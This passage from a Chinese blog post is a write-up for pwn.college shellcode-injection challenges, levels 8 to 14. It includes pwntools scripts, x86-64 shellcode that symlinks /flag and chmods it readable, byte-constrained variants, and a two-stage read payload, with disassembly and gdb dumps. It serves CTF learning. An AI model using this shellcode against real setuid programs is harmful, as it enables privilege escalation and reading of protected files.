<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> warnings <span class="token keyword">import</span> filterwarnings
<span class="token keyword">import</span> os

filterwarnings<span class="token punctuation">(</span>action<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> category<span class="token operator">=</span>BytesWarning<span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/challenge/babyshell_level8'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elf
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>

shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
push 0x66  /* ASCII für 'f' */
mov rdi, rsp
push 4
pop rsi
push SYS_chmod
pop rax
syscall
'''</span></span>

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ln -s /flag f'</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"from stdin"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat f'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>既然系统调用会用当前执行目录补全相对路径的话，之前的方法也是可以用的。我们可以手动在当前目录下，创建一个指向<code>openflag</code>文件的符号链接，然后把这个符号链接文件名传递给<code>execve</code>系统调用。然后<code>baby</code>程序会运行<code>openflag</code>程序，<code>openflag</code>程序会把<code>flag文件</code>输出。</p>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>修改10的倍数位置的二进制位cc, 我们可以在临近10位置的时候增加一个短跳转。跳过10的奇数倍。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> shellcode_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> shellcode_mem<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\xcc'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64

section .text
global _start

_start:
    push 0x66  
    mov rdi, rsp
    jmp _1
    nop
    nop
    nop
    times 10 nop  # 跳过第11-20个字节

_1:
    push 4
    pop rsi
    push 90
    pop rax
    syscall

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000001b4a5000 | 6a 66                                         | push 0x66
0x000000001b4a5002 | 48 89 e7                                      | mov rdi, rsp
0x000000001b4a5005 | eb 0d                                         | jmp 0x1b4a5014
0x000000001b4a5007 | 90                                            | nop 
0x000000001b4a5008 | 90                                            | nop 
0x000000001b4a5009 | 90                                            | nop 
0x000000001b4a500a | cc                                            | int3 
0x000000001b4a500b | cc                                            | int3 
0x000000001b4a500c | cc                                            | int3 
0x000000001b4a500d | cc                                            | int3 
0x000000001b4a500e | cc                                            | int3 
0x000000001b4a500f | cc                                            | int3 
0x000000001b4a5010 | cc                                            | int3 
0x000000001b4a5011 | cc                                            | int3 
0x000000001b4a5012 | cc                                            | int3 
0x000000001b4a5013 | cc                                            | int3 
0x000000001b4a5014 | 6a 04                                         | push 4
0x000000001b4a5016 | 5e                                            | pop rsi
0x000000001b4a5017 | 6a 5a                                         | push 0x5a
0x000000001b4a5019 | 58                                            | pop rax
0x000000001b4a501a | 0f 05                                         | syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>level10这一关会对输出的数据，按照<code>uint_64</code>为一个单位（8个字节）进行冒泡排序。我们只需要保证第8个字节的数值大于第16个字节的数据就行。 </p>
<p>看了一下之前level8中的代码就能用。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000030275000 | 6a 66                                         | push 0x66
0x0000000030275002 | 48 89 e7                                      | mov rdi, rsp
0x0000000030275005 | 6a 04                                         | push 4
0x0000000030275007 | 5e                                            | pop rsi # 这个数值是大于05的
0x0000000030275008 | 6a 5a                                         | push 0x5a
0x000000003027500a | 58                                            | pop rax
0x000000003027500b | 0f 05                                         | syscall # 这个只有5个字节，肯定是小于上面那个数的

Executing shellcode!


pwn.college&#123;&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>跟上面那个一样，也是冒泡排序。但是在执行shellcode之前，会关闭<code>stdin</code>。它给的提示是<code>which means that it will be harder to pass in a stage-2 shellcode.</code> 应该可以通过输入shellcode，然后再读取输入？应该可以，它shellcode的初始地址是一定的，你只需要往后面写就行应该，算好偏移量的前提。</p>
<p>但是我们是修改文件权限的，跟标准输出没有关系，所以我们直接复用之前的代码就行。</p>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>这一关跟之前的区别是，输入的字节数必须要互不相同。方法就是要找一些等效指令，对应的二进制不要相同。 这里我把符号链接的名字设置为了<code>0x5a</code>，这样跟<code>chmod</code>的系统调用号一样，我可以通过栈顶指针将<code>0x5a</code>赋值给<code> rax</code>。虽然不知道这种情况下，rax寄存器那些高位的数值是否为0。但这样是可行的。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000015b1f000 | 6a 5a                                         | push 0x5a
0x0000000015b1f002 | 54                                            | push rsp
0x0000000015b1f003 | 5f                                            | pop rdi
0x0000000015b1f004 | 40 b6 04                                      | mov sil, 4
0x0000000015b1f007 | 8a 07                                         | mov al, byte ptr [rdi]
0x0000000015b1f009 | 0f 05                                         | syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>要求0xc个字节以内，数了一下刚好12关的刚好11个字节，直接复用就行。</p>
<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>最后一关，要求6个字节！</p>
<p>看了网上的解析，需要一个stage2的代码，先通过shellcode调用read，往缓冲区中放入新的shellcode，然后在执行。</p>
<p>这里需要注意的是，调用syscall-read以后，rip的指向已经到了<code>0x1b3f5006</code>，但是之前调用read时，缓冲区的地址设置的是<code>0x1b3f5000</code>，stage-2部分代码是要在<code>0x1b3f5000</code>处开始写，但是代码要在<code>0x1b3f5006</code>处开始执行，所以前面需要用nop指令进行填充。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">
这是调用shellcod函数之前的寄存器结构

(gdb) info registers
rax            0x0                 0  # 刚好是read函数的系统调用号
rbx            0x5555555557e0      93824992237536
rcx            0x7ffff6d15297      140737334301335
rdx            0x1b3f5000          457134080 # 刚好是缓冲区地址
rsi            0x5555555592a0      93824992252576
rdi            0x7ffff6df57e0      140737335220192
rbp            0x7fffffffdf00      0x7fffffffdf00
rsp            0x7fffffffdeb8      0x7fffffffdeb8
r8             0x16                22
r9             0xb                 11

栈内容以及eip的走向
      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000018fa4000 | 31 ff                                         | xor edi, edi
0x0000000018fa4002 | 52                                            | push rdx
0x0000000018fa4003 | 5e                                            | pop rsi
0x0000000018fa4004 | 0f 05                                         | syscall 

1: x&#x2F;16i $pc
&#x3D;&gt; 0x1b3f5000:  xor    %edi,%edi
   0x1b3f5002:  push   %rdx
   0x1b3f5003:  pop    %rsi
   0x1b3f5004:  syscall
   0x1b3f5006:  add    %al,(%rax)
   0x1b3f5008:  add    %al,(%rax)
   0x1b3f500a:  add    %al,(%rax)
   0x1b3f500c:  add    %al,(%rax)
   0x1b3f500e:  add    %al,(%rax)
   0x1b3f5010:  add    %al,(%rax)
   0x1b3f5012:  add    %al,(%rax)
   0x1b3f5014:  add    %al,(%rax)
   0x1b3f5016:  add    %al,(%rax)
   0x1b3f5018:  add    %al,(%rax)
   0x1b3f501a:  add    %al,(%rax)
   0x1b3f501c:  add    %al,(%rax)

1: x&#x2F;16i $pc
&#x3D;&gt; 0x1b3f5004:  syscall
   0x1b3f5006:  add    %al,(%rax)
   0x1b3f5008:  add    %al,(%rax)
   0x1b3f500a:  add    %al,(%rax)
   0x1b3f500c:  add    %al,(%rax)
   0x1b3f500e:  add    %al,(%rax)
   0x1b3f5010:  add    %al,(%rax)
   0x1b3f5012:  add    %al,(%rax)
   0x1b3f5014:  add    %al,(%rax)
   0x1b3f5016:  add    %al,(%rax)
   0x1b3f5018:  add    %al,(%rax)
   0x1b3f501a:  add    %al,(%rax)
   0x1b3f501c:  add    %al,(%rax)
   0x1b3f501e:  add    %al,(%rax)
   0x1b3f5020:  add    %al,(%rax)
   0x1b3f5022:  add    %al,(%rax)


1: x&#x2F;16i $pc
&#x3D;&gt; 0x1b3f5006:  nop
   0x1b3f5007:  push   $0x66
   0x1b3f5009:  mov    %rsp,%rdi
   0x1b3f500c:  push   $0x4
   0x1b3f500e:  pop    %rsi
   0x1b3f500f:  push   $0x3b
   0x1b3f5011:  pop    %rax
   0x1b3f5012:  syscall
   0x1b3f5014:  add    %al,(%rax)
   0x1b3f5016:  add    %al,(%rax)
   0x1b3f5018:  add    %al,(%rax)
   0x1b3f501a:  add    %al,(%rax)
   0x1b3f501c:  add    %al,(%rax)
   0x1b3f501e:  add    %al,(%rax)
   0x1b3f5020:  add    %al,(%rax)
   0x1b3f5022:  add    %al,(%rax)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> warnings <span class="token keyword">import</span> filterwarnings
<span class="token keyword">import</span> os

filterwarnings<span class="token punctuation">(</span>action<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> category<span class="token operator">=</span>BytesWarning<span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/challenge/babyshell_level14'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elf
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>

shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
xor edi, edi
push rdx
pop rsi
syscall
nop
nop
nop
nop
nop
nop
nop
push 0x66  /* ASCII für 'f' */
mov rdi, rsp
push 4
pop rsi
push SYS_chmod
pop rax
syscall
'''</span></span>

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ln -s /flag f'</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"from stdin"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat f'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">美食家李老叭</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://laobameishijia.github.io/2024/07/09/pwn-college-shellcode-injection-writeup/">https://laobameishijia.github.io/2024/07/09/pwn-college-shellcode-injection-writeup/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">美食家李老叭</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tag/%E9%80%86%E5%90%91/">
                                    <span class="chip bg-color">逆向</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/av-min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'q5k1wXexowy7MeNN0CrLYpoK-gzGzoHsz',
        appKey: 'YmFtstASS0GUVRowdQQl4LPb',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/07/30/pwn-college-memory-writeup/">
                    <div class="card-image">
                        
                        <img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png" class="responsive-img" alt="PWN-College-memory-errors-Writeup">
                        
                        <span class="card-title">PWN-College-memory-errors-Writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CTF
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-07-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/category/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tag/%E9%80%86%E5%90%91/">
                        <span class="chip bg-color">逆向</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/07/09/qiu-zhi-zhi-lu-xue-xi/">
                    <div class="card-image">
                        
                        <img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/QQ截图20240721095809.png" class="responsive-img" alt="求职之路-学习">
                        
                        <span class="card-title">求职之路-学习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            求职
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-09
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/category/%E5%AD%A6%E4%B9%A0/" class="post-category">
                                    学习
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tag/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">常见知识</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2025</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">老叭美食家</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">256.3k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2021";
                        var startMonth = "5";
                        var startDate = "21";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
